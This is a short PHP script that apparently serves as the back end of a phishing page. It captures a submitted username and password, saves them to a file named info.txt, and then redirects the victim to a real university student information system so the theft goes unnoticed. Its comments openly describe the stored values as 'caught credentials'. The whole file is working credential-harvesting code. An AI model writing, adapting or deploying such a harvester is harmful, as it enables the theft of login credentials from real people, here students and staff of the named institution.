<?php 

//this stores credentials in a file and redirects the user to original website
//info.txt file is the place where the caught credentials are stored

// assign the file name to a variable
$myFile = "info.txt"; 
// Open the info.txt file for writing purpose. If it cannot be opened then show the massage can't open the file
$fh = fopen($myFile, 'w') or die("can't open file");

//get the uname value to a variable
$uname=$_POST['uname'];
// write the uname in info.txt ile
fwrite($fh, $uname);

// keep a space in info.txt ile
$space="   ";
fwrite($fh, $space);

//get the password value to a variable
$pword=$_POST['pw'];
// write the password in info.txt ile
fwrite($fh, $pword);

// close the opened info.txt file
fclose($fh);

//derect to the original url
header("Location: http://sis.cmb.ac.lk/sci/");
exit();

?>
